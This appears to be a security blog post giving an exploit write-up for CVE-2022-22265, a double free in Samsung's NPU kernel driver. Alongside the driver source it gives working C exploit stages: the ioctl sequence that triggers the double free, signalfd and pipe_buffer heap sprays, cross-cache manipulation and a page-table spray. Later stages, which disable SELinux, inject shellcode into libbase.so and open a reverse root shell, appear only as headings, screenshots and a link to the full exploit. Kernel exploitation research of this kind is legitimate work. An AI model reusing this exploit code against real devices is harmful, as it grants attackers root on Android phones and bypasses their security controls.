---
layout: post
title: CVE-2022-22265 Samsung npu driver
date: 2024-08-12
categories: ["CVE", "Exploit", "Linux", "Kernel", "Android"]
thumbnail: "assets/images/thumb_4.png"
---

## Introduction

I wanted to do a bug from Samsung and I chose this [https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html). It is well explained, when you read it, you'll know wich involves a double free. Finally I chose another more generic strategy that I am going to explain next. Linux kernel 5.10.177.

## Warning

Getting context from npu driver..

![policy_npu](/assets/images/policy_npu.png)

The NPU driver in this version is restricted from shell. If you want to use this exploit, you'll need to adapt it to an unstrusted app.

**/sys/fs/selinux/policy** 

![policy_shell](/assets/images/policy_shell.png)
![policy_unstrusted_app](/assets/images/policy_untrusted_app.png)

Also, this NPU driver version had the bug patched (Samsung A25), so I modified the communication with the firmware in **npu-interface.c** (because the whole analysis it was unnecessary, I did just enough to avoid crashing, each firmware includes its own extra check code, I don't want to do hard work for nothing, thanks). If you want help with reversing the firmware you could look at [this](https://blog.impalabs.com/2103_reversing-samsung-npu.html) and [this](https://blog.impalabs.com/2110_exploiting-samsung-npu.html). You'll need to adapt it as well.

![npu_patched](/assets/images/npu_patched.png)

## The bug

The first free comes from ioctl VS4L_VERTEXIOC_S_FORMAT wich finally calls to vb_queue_s_format that does this.

```C
int vb_queue_s_format(struct vb_queue *q, struct vs4l_format_list *flist)
{

int ret = 0;
u32 i;
struct vs4l_format *f;
struct vb_fmt *fmt;

q->format.count = flist->count;
q->format.formats = kcalloc(flist->count, sizeof(struct vb_format), GFP_KERNEL);

...

for (i = 0; i < flist->count; ++i) {
	f = &flist->formats[i];

	fmt = __vb_find_format(f->format);
	if (!fmt) {
		vision_err("__vb_find_format is fail\n");
		kfree(q->format.formats);
		ret = -EINVAL;
		goto p_err;
	}
	
	...
	
	set_bit(VB_QUEUE_STATE_FORMAT, &q->state);
p_err:
	return ret;
```

If it has an invalid format, it will perform the first free. The second free can be triggered by calling ioctl VS4L_VERTEXIOC_STREAM_OFF wich calls vb_queue_stop to clean up the queue related data structures. vb_queue_stop calls kfree(q->format.formats) on the previously freed q->format.formats as a part of the clean-up process. To see what happens when we need to perform the second free, refer to the following code.

```C
static int npu_vertex_streamoff(struct file *file)
{

...

if (!(vctx->state & BIT(NPU_VERTEX_STREAMON))) {
	npu_ierr("invalid state(0x%X)\n", vctx, vctx->state);
	ret = -EINVAL;
	goto p_err;
}

if (!(vctx->state & BIT(NPU_VERTEX_FORMAT))
    || !(vctx->state & BIT(NPU_VERTEX_GRAPH))) {
	npu_ierr("invalid state(%X)\n", vctx, vctx->state);
	ret = -EINVAL;
	goto p_err;
}

...

ret = chk_nw_result_no_error(session);
if (ret == NPU_ERR_NO_ERROR) {
	vctx->state |= BIT(NPU_VERTEX_STREAMOFF);
	vctx->state &= (~BIT(NPU_VERTEX_STREAMON));
} else {
	goto p_err;
}

ret = npu_queue_stop(queue, 0);
if (ret) {
	npu_ierr("fail(%d) in npu_queue_stop\n", vctx, ret);
	goto p_err;
}

...

int npu_queue_stop(struct npu_queue *queue, int is_forced)
{

int ret = 0;
struct vb_queue *inq, *otq;

inq = &queue->inqueue;
otq = &queue->otqueue;

if (!test_bit(VB_QUEUE_STATE_START, &inq->state) && test_bit(VB_QUEUE_STATE_FORMAT, &inq->state)) {
	npu_info("already npu_queue_stop inq done\n");
	goto p_err;
}

if (!test_bit(VB_QUEUE_STATE_START, &otq->state) && test_bit(VB_QUEUE_STATE_FORMAT, &otq->state)) {
	npu_info("already npu_queue_stop otq done\n");
	goto p_err;
}
```

We need set the bits **NPU_VERTEX_GRAPH**, **VB_QUEUE_STATE_FORMAT**, **NPU_VERTEX_FORMAT** and **NPU_VERTEX_STREAMON**. However, when we trigger the first free, **NPU_VERTEX_GRAPH** gets unset :(

```C
static int npu_vertex_s_format(struct file *file, struct vs4l_format_list *flist)
{

...

ret = npu_queue_s_format(queue, flist);
if (ret) {
	npu_ierr("fail(%d) in npu_queue_s_format\n", vctx, ret);
	goto p_err;
}

...

if (flist->direction == VS4L_DIRECTION_OT) {
	ret = npu_session_NW_CMD_LOAD(session);
	ret = chk_nw_result_no_error(session);
	if (ret == NPU_ERR_NO_ERROR) {
		vctx->state |= BIT(NPU_VERTEX_FORMAT);
	} else {
		goto p_err;
	}
}

...
	
p_err:
	vctx->state &= (~BIT(NPU_VERTEX_GRAPH));
	mutex_unlock(lock);
	npu_scheduler_boost_off_timeout(info, NPU_SCHEDULER_BOOST_TIMEOUT);
	return ret;
```

Then the strategy to leverage both kfree is; realize that vb_queue could be as input or output.

* ioctl graph
* ioctl format (set VB_QUEUE_STATE_FORMAT as input)
* ioctl graph 
* ioctl format (first input kfree)
* ioctl graph (set NPU_VERTEX_GRAPH)
* ioctl format (set NPU_VERTEX_FORMAT as output)
* ioctl streamon (set NPU_VERTEX_STREAMON)
* ioctl streamoff (double input kfree)

## Strategy

The signalfd object will occupy the kernel's freed object (size 128). Next, the exploit frees the object again using the ioctl command VS4L_VERTEXIOC_STREAM_OFF and reuses the freed kernel object with a set of pipe_buffer structures using fcntl(fd, F_SETPIPE_SZ, size), similar to the first strategy. This is done to locate the signalfd object and perform cross-cache operations later, by closing the pipe_buffer object (located as well) and emptying the page of the signalfd object. After this, I perform a PTE spray to match the signalfd UAF and manage the page. Once this is done, signalfd has limitations (I'll explain later), so I migrate to a virtual memory area to manage the page (full phys r/w). Next, I locate the kernel base to disable SELinux and access init_task, finding current->mm->pgd to perform an MMU walk, and set the libbase.so page with permissions to inject shellcode over LogLine method (within the LogMessage object), wich will be executed by the init process.

## signalfd as a UAF object

I chose the signalfd object wich is allocated from kmalloc-128 to overwrite the first freed object. It will be useful for managing a victim page table entry (PTE). However, it has limitations, the write operation will receive an OR of 0x40100. Nevertheless, it will be possible to search for a valid page table within a user virtual memory area to achieve full management of a PTE.

```
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
	struct signalfd_ctx *ctx;

	/* Check the SFD_* constants for consistency.  */
	BUILD_BUG_ON(SFD_CLOEXEC != O_CLOEXEC);
	BUILD_BUG_ON(SFD_NONBLOCK != O_NONBLOCK);

	if (flags & ~(SFD_CLOEXEC | SFD_NONBLOCK))
		return -EINVAL;

	sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP)); // [1] bit 18 and bit 8 of mask will be set to 1 -> 0x40100
	signotset(mask);

	if (ufd == -1) {
		ctx = kmalloc(sizeof(*ctx), GFP_KERNEL); // [2] alloc
		printk("do_signalfd4 alloc ctx: 0x%016lx\n", ctx);
		if (!ctx)
			return -ENOMEM;

		ctx->sigmask = *mask;

		/*
		 * When we call this, the initialization must be complete, since
		 * anon_inode_getfd() will install the fd.
		 */
		ufd = anon_inode_getfd("[signalfd]", &signalfd_fops, ctx,
				       O_RDWR | (flags & (O_CLOEXEC | O_NONBLOCK)));
		if (ufd < 0)
			kfree(ctx);
	} else {
		struct fd f = fdget(ufd);
		if (!f.file)
			return -EBADF;
		ctx = f.file->private_data;
		if (f.file->f_op != &signalfd_fops) {
			fdput(f);
			return -EINVAL;
		}
		spin_lock_irq(&current->sighand->siglock);
		ctx->sigmask = *mask; // [3] write operation
		spin_unlock_irq(&current->sighand->siglock);

		wake_up(&current->sighand->signalfd_wqh);
		fdput(f);
	}

	return ufd;
}
```

## spray pipe_buffer to locate signalfd

To manage a PTE, we need to allocate them from the buddy allocator. Then, we need to perform cross-cache on the signalfd UAF object to allocate PTEs over it. To achieve this, we perform a spray of pipe_buffer objects of size 128. In the fcntl function, the third argument is 4096 * n, where n is a power of 2, which determines the size of the pipe_buffer object as 40 * n.

```C
/* spray pipe_buffer */
char buf[(2 << 12)];
for (int64_t i = 0; i < MAX_PIPES; i++) {
	
	// pin_cpu(i % ncpu);
	
	// The arg has to be pow of 2
	if (fcntl(pipefd[i][1], F_SETPIPE_SZ, 4096 * 2) < 0) {
		printf("[-] fcntl: %d\n", errno);
		exit(0);
	}
	
	*(int64_t *) buf = i;

	if (write(pipefd[i][1], buf, (1 << 12) + 8) < 0) {
		printf("[-] write: %d\n", errno);
		exit(0);
	}
}
```

With this, we can search for the signalfd UAF object.

```C
uint64_t leak;
char file[64] = {0};
char buffer[256] = {0};
/* locating vulnerable object (uaf) */
for (uint32_t j = 0; j < MAX_SIGNAL; j++) {
	snprintf(file, 26, "/proc/self/fdinfo/%d", fd_cross[offset + j]);
	
	fd_read = open(file, O_RDONLY);
	
	if (fd_read < 0) {
		printf("[-] open: %d\n", errno);
		exit(0);
	}
	
	int n = read(fd_read, buffer, 72);
	
	if (n < 0) {
		printf("[-] read: %d\n", errno);
		exit(0);
	}
	
	if (strncmp(&buffer[47], "fffffffffffbfeff", 16)) {
		leak = ~strtoul(&buffer[47], (char **) NULL, 16);
		
		printf("[+] pipe_buffer->page leak: 0x%016lx\n", leak);
		fd_idx = offset + j;
		break;
	}
	
	bzero(file, 26);
	bzero(buffer, 72);
}
```

## cross cache

First, I should mention that I open 0x3800 signalfd files initially to improve cross-cache. After this, I start the cross-cache process by opening CPU_PARTIAL * OBJS_PER_SLAB. Then, after the first kfree, I get the UAF object.

```C
/* init signalfd to better cross cache */
for (int i = 0; i < NUM_FILES; i++) {
	
	// pin_cpu(i % ncpu);
	
	mask.sig[0] = ~0; // | 0x40100
	
	fd_init[i] = signalfd(-1, &mask, 0);
	
	if (fd_init[i] < 0) {
		printf("[-] signalfd: %d\n", errno);
		exit(0);
	}
}

uint32_t i = 0, fd_idx = 0, offset =  0;

puts("[+] start signalfd cross cache");
/* start cross cache */
for (i = 0; i < (CPU_PARTIAL * OBJS_PER_SLAB); i++) { // [1] CPU_PARTIAL = 512
	
	// pin_cpu(i % ncpu);
	
	mask.sig[0] = ~0; // | 0x40100
	
	fd_cross[i] = signalfd(-1, &mask, 0);
	
	if (fd_cross[i] < 0) {
		printf("[-] signalfd: %d\n", errno);
		exit(0);
	}
}

offset = i;
	
/* do format ioctl */
do_format_ioctl(fd, N, VS4L_DIRECTION_IN, 1337);

puts("[+] getting vulnerable object (from signalfd)");

/* getting object vulnerable */
for (i = 0; i < MAX_SIGNAL; i++) {
	
	// pin_cpu(i % ncpu);
	
	mask.sig[0] = ~0; // | 0x40100
	
	fd_cross[offset + i] = signalfd(-1, &mask, 0);
	
	if (fd_cross[offset + i] < 0) {
		printf("[-] signalfd: %d\n", errno);
		exit(0);
	}
}
```

We are able to search the pipe_buffer object to close it and avoid affecting signalfd object.

```C
/* locating vulnerable object (cross cache) */
int c;
for (int j = 0; j < MAX_PIPES; j++) {
	int n = read(pipefd[j][0], &c, 4);
	
	if (n < 0 || j != c) {
		printf("[+] pipe fd found at %dth\n", j);
		pos = j;
		break;
	}
}

if (pos == -1) {
	puts("[-] Exploit failed :(");
	exit(0);
}

puts("[+] free vulnerable object (from pipe_buffer)");

close(pipefd[pos][0]); // free vulnerable object
close(pipefd[pos][1]);
```

And empty the victim page on beast mode (but most useful).

```C
/* emptying the page of the fd vulnerable */
for (i = 0; i < (CPU_PARTIAL * OBJS_PER_SLAB); i++) {
	close(fd_cross[i]);
}

/* discard slab */
for (i = 0; i < MAX_SIGNAL; i++) {
	if ((offset + i) != fd_idx) {
		close(fd_cross[offset + i]);
	}
}
```

## spray pte

If we read [this](https://offlinemark.com/demand-paging/) interesting article, we realize that we need to call mmap first and after access to the pages. We are going to alloc 32 page tables (a page table 512 * 4096 = 2MB).

```C
/* mmap spray pte */
uint64_t addr = 0x20000;
for (uint32_t i = 0; i < NUM_TABLE; i++) {
	for (uint32_t j = 0; j < NUM_PTE; j++) {
		if ((map[i][j] = mmap((void *) addr + (i * 0x200000) + (j * 0x1000), 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, 0)) == MAP_FAILED) {
			perror("[-] mmap()");
			exit(0);
		}
	}
}
```

Access them finally to spray.

```C
/* spray PTE */
for (uint32_t i = 0; i < NUM_TABLE; i++) {
	for (uint32_t j = 0; j < NUM_PTE; j++) {
		*(uint32_t *) map[i][j] = (i * 0x200) + j;
	}
}
```

We have already a signalfd object managing a PTE (phys r/w) with limitations.

## migrate to a vma

## locate kernel

## disable selinux

## inject code into libbase.so

## trigger and getting reverse root shell

##### Demo

![thumb](/assets/images/thumb_4.png)
![reverse shell](/assets/images/reverse_shell.png)

##### Full exploit

[https://gist.github.com/soez/66eabe37a8dec0937cba8e0cb1ab7ebb](https://gist.github.com/soez/66eabe37a8dec0937cba8e0cb1ab7ebb)

## Improvements

## References

[https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html)
[https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html)
[https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606)
[https://offlinemark.com/demand-paging/](https://offlinemark.com/demand-paging/)
[https://blog.impalabs.com/2103_reversing-samsung-npu.html](https://blog.impalabs.com/2103_reversing-samsung-npu.html)
[https://blog.impalabs.com/2110_exploiting-samsung-npu.html](https://blog.impalabs.com/2110_exploiting-samsung-npu.html)
